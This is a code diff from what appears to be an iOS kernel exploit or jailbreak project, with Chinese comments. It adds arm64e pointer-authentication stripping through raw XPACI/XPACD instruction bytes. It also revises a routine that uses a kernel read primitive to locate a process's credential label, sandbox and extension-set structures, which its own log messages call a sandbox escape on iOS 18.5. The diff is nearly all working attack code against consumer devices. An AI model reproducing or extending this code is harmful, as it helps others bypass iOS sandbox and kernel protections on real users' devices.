@@ -70,6 +70,59 @@ static inline bool ds_is_kaddr(uint64_t addr)
     return (addr & 0xfffff00000000000ULL) == 0xfffff00000000000ULL;
 }
 
+/// 只认两个「确定已映射」的区域：
+///   heap/zone  0xffffffe000000000 – 0xffffffefffffffff
+///   kernel 静态段 0xfffffff000000000 – 0xfffffffeffffffff
+/// 其它一律不碰，避免解引用未映射地址把内核打崩（我们已经被这个问题坑过一次）。
+static inline bool ds_is_kernel_region(uint64_t address)
+{
+    return (address >= 0xffffffe000000000ULL && address < 0xfffffff000000000ULL) ||
+           (address >= 0xfffffff000000000ULL && address < 0xfffffffeffffffffULL);
+}
+
+/// XPACI / XPACD：arm64e 上剥离指针签名。用 naked 函数直接放指令字节，
+/// 所以 arm64 产物在 arm64e 硬件上也能执行（与上游 xpaci.h 同一手法）。
+static uint64_t __attribute__((naked)) ds_xpaci(uint64_t value)
+{
+    __asm__ volatile(".long 0xDAC143E0");   // XPACI X0
+    __asm__ volatile("ret");
+}
+
+static uint64_t __attribute__((naked)) ds_xpacd(uint64_t value)
+{
+    __asm__ volatile(".long 0xDAC147E0");   // XPACD X0
+    __asm__ volatile("ret");
+}
+
+#define DS_FORM_COUNT 6
+
+/// 把一个可能带 PAC 签名 / 高位被抹掉的指针，还原成若干候选 VA（只保留落在已知映射区里的）
+static int ds_pointer_forms(uint64_t raw, uint64_t out[DS_FORM_COUNT])
+{
+    if (!raw) return 0;
+
+    // 实测数据（iOS 18.5 / A14）：cr_label 存的是 fe988be09fe407c0，
+    // 真正的 VA 是低 36 位补堆段 → 0xffffffe09fe407c0。所以这一形态必须优先。
+    uint64_t forms[DS_FORM_COUNT] = {
+        raw,
+        (raw & 0x0000000FFFFFFFFFULL) | 0xFFFFFFE000000000ULL,   // 低 36 位 + 堆段
+        (raw & 0x0000000FFFFFFFFFULL) | 0xFFFFFFF000000000ULL,   // 低 36 位 + 静态段
+        (raw & 0x0000FFFFFFFFFFFFULL) | 0xFFFF000000000000ULL,   // 低 48 位 + 内核段
+        ds_xpaci(raw),
+        ds_xpacd(raw)
+    };
+
+    int count = 0;
+    for (int i = 0; i < DS_FORM_COUNT; i++) {
+        uint64_t value = forms[i];
+        if (!value || !ds_is_kernel_region(value)) continue;
+        bool duplicate = false;
+        for (int k = 0; k < count; k++) if (out[k] == value) duplicate = true;
+        if (!duplicate) out[count++] = value;
+    }
+    return count;
+}
+
 /// 地址非法就返回 0，绝不调用 early_kread（那会触发上游的故意崩溃 / while(1)）
 static uint64_t ds_kread_safe(uint64_t addr)
 {
@@ -82,24 +135,17 @@ static uint32_t ds_kread32_safe(uint64_t addr)
     return (uint32_t)(ds_kread_safe(addr) & 0xFFFFFFFFULL);
 }
 
-/// 指针可能是 PAC / SMR 形态，逐个候选形态试，谁能让链路走通就用谁。
-/// 注意：0 和低位垃圾必须返回 0，否则空槽会被误判成合法内核指针。
+/// 指针可能是 PAC / SMR 形态，取第一个落在已知映射区里的候选形态
 static uint64_t ds_normalize_ptr(uint64_t raw)
 {
-    if (raw == 0) return 0;
+    uint64_t forms[DS_FORM_COUNT];
+    if (ds_pointer_forms(raw, forms) == 0) return 0;
 
-    uint64_t low48 = raw & 0x0000FFFFFFFFFFFFULL;
-    if (low48 < 0x1000) return 0;                 // 空槽 / 垃圾值
-
-    if (ds_is_kaddr(raw)) return raw;             // 已经是合法内核指针（含只有高位 PAC 的形态）
-
-    uint64_t withTop = low48 | 0xFFFF000000000000ULL;
-    if (ds_is_kaddr(withTop)) return withTop;     // 高位被抹掉
-
-    uint64_t smr = (low48 & ~0x1FULL) | 0xFFFF000000000000ULL;
-    if (ds_is_kaddr(smr)) return smr;             // SMR 低位标记
-
-    return 0;
+    // 优先挑堆对象（ucred/label/sandbox/ext 都在 zone 里）
+    for (int i = 0; i < DS_FORM_COUNT; i++) {
+        if ((forms[i] & 0xFFFFFFFFFFF00000ULL) == 0xFFFFFFE000000000ULL) return forms[i];
+    }
+    return forms[0];
 }
 
 #pragma mark - 找到本进程的 proc
@@ -626,55 +672,61 @@ static uint64_t ds_discover_identities_v3(void)
 /// ext_set 还要能读出真正的 ext 链。三道都对上才认。
 static uint64_t ds_resolve_sandbox_extset(uint64_t cred, uint64_t *outSandbox)
 {
+    // 列表首位是「实测/文档最可能」的值，命中即返回，避免做无谓的解引用
     static const uint64_t labelOffs[]   = { 0x78, 0x70, 0x80, 0x68, 0x88, 0x90, 0x60 };
     static const uint64_t sandboxOffs[] = { 0x10, 0x08, 0x18, 0x20, 0x28, 0x30 };
     static const uint64_t extSetOffs[]  = { 0x10, 0x08, 0x18, 0x20, 0x28, 0x30 };
 
     for (int a = 0; a < 7; a++) {
-        uint64_t label = ds_kread_safe(cred + labelOffs[a]);
-        if (!ds_is_kaddr(label) || (label & 0xF) != 0) continue;
+        uint64_t labelForms[DS_FORM_COUNT];
+        int labelCount = ds_pointer_forms(ds_kread_safe(cred + labelOffs[a]), labelForms);
 
-        // label 结构签名：AMFI 槽与 sandbox 槽必须都是内核指针
-        uint64_t amfi = ds_kread_safe(label + 0x08);
-        if (!ds_is_kaddr(amfi)) {
-            ds_log("[逃逸] cred+0x%llx = 0x%llx，但 +0x8(AMFI) = 0x%llx 不是内核指针，跳过",
-                   (unsigned long long)labelOffs[a], (unsigned long long)label, (unsigned long long)amfi);
-            continue;
-        }
+        for (int la = 0; la < labelCount; la++) {
+            uint64_t label = labelForms[la];
 
-        for (int b = 0; b < 6; b++) {
-            uint64_t sandbox = ds_kread_safe(label + sandboxOffs[b]);
-            if (!ds_is_kaddr(sandbox) || (sandbox & 0xF) != 0) continue;
+            // label 结构签名：l_perpolicy[0]（AMFI 槽）必须是内核指针
+            if (!ds_normalize_ptr(ds_kread_safe(label + 0x08))) continue;
 
-            for (int c = 0; c < 6; c++) {
-                uint64_t extSet = ds_kread_safe(sandbox + extSetOffs[c]);
-                if (!ds_is_kaddr(extSet)) continue;
+            for (int b = 0; b < 6; b++) {
+                uint64_t sandboxForms[DS_FORM_COUNT];
+                int sandboxCount = ds_pointer_forms(ds_kread_safe(label + sandboxOffs[b]), sandboxForms);
 
-                // ext 链校验：ext_set 里至少一个槽能读出 ext 头，且 头+0x8 是内核指针
-                bool extLooksRight = false;
-                for (int slot = 0; slot < 8 && !extLooksRight; slot++) {
-                    uint64_t hdr = ds_normalize_ptr(ds_kread_safe(extSet + slot * 8));
-                    if (!ds_is_kaddr(hdr)) continue;
-                    uint64_t ext = ds_normalize_ptr(ds_kread_safe(hdr + 0x8));
-                    if (ds_is_kaddr(ext)) extLooksRight = true;
+                for (int sb = 0; sb < sandboxCount; sb++) {
+                    uint64_t sandbox = sandboxForms[sb];
+
+                    for (int c = 0; c < 6; c++) {
+                        uint64_t extSetForms[DS_FORM_COUNT];
+                        int extSetCount = ds_pointer_forms(ds_kread_safe(sandbox + extSetOffs[c]), extSetForms);
+
+                        for (int es = 0; es < extSetCount; es++) {
+                            uint64_t extSet = extSetForms[es];
+
+                            // 第三道：ext_set 里要能读出真正的 ext 链
+                            bool extLooksRight = false;
+                            for (int slot = 0; slot < 8 && !extLooksRight; slot++) {
+                                uint64_t hdr = ds_normalize_ptr(ds_kread_safe(extSet + (uint64_t)slot * 8));
+                                if (!hdr) continue;
+                                uint64_t ext = ds_normalize_ptr(ds_kread_safe(hdr + 0x8));
+                                if (ext) extLooksRight = true;
+                            }
+                            if (!extLooksRight) continue;
+
+                            gCredOff.labelOff = labelOffs[a];
+                            gCredOff.sandboxOff = sandboxOffs[b];
+                            gCredOff.extSetOff = extSetOffs[c];
+                            if (outSandbox) *outSandbox = sandbox;
+
+                            ds_log("[逃逸] 沙盒链路确认：cred+0x%llx → label 0x%llx（形态 %d）；"
+                                    "label+0x%llx → sandbox 0x%llx；sandbox+0x%llx → ext_set 0x%llx",
+                                   (unsigned long long)labelOffs[a], (unsigned long long)label, la,
+                                   (unsigned long long)sandboxOffs[b], (unsigned long long)sandbox,
+                                   (unsigned long long)extSetOffs[c], (unsigned long long)extSet);
+                            return extSet;
+                        }
+                    }
                 }
-                if (!extLooksRight) continue;
-
-                gCredOff.labelOff = labelOffs[a];
-                gCredOff.sandboxOff = sandboxOffs[b];
-                gCredOff.extSetOff = extSetOffs[c];
-                if (outSandbox) *outSandbox = sandbox;
-
-                ds_log("[逃逸] 沙盒链路确认：cred+0x%llx=label 0x%llx，label+0x%llx=sandbox 0x%llx，"
-                        "sandbox+0x%llx=ext_set 0x%llx",
-                       (unsigned long long)labelOffs[a], (unsigned long long)label,
-                       (unsigned long long)sandboxOffs[b], (unsigned long long)sandbox,
-                       (unsigned long long)extSetOffs[c], (unsigned long long)extSet);
-                return extSet;
             }
         }
-        ds_log("[逃逸] label 0x%llx（cred+0x%llx）找到了，但 label→sandbox→ext_set 没对上",
-               (unsigned long long)label, (unsigned long long)labelOffs[a]);
     }
 
     return 0;
